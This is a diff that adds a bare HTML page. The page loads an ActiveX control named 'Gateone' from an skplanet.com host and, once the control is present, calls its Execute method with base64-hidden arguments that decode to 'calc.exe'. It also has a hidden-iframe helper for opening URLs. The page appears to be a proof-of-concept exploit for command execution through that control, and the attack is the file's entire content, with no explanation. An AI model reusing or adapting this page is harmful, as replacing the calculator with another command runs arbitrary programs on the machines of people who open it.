@@ -1,0 +1,29 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+	<script src="https://esac.skplanet.com/JS/p_common.js"></script>
+        <script>
+            function getClientVersion(){
+                ver = "none";
+                DevcieConn.checkClient(ver);
+            }
+
+            function execute_gateviewer(url){
+                var iframe = document.createElement("IFRAME");
+                iframe.setAttribute("src", url);
+                document.documentElement.appendChild(iframe);
+                iframe.parentNode.removeChild(iframe);
+                iframe = null;
+            }
+        </script>
+</head>
+<body>
+	<object	id="AXtmp" name="AXtmp" classid="clsid:4FE2721F-80B2-4B73-B76E-04242E80C254" codebase="https://esac.skplanet.com/download/ActiveXGateone.CAB#version=1,0,2,1"></object>
+	<script>
+		if (null != AXtmp.object) {	// IEww
+			AXtmp.Execute("Qw==", "Y2FsYy5leGU=", "");
+		}
+	</script>
+	</body>
+</html>
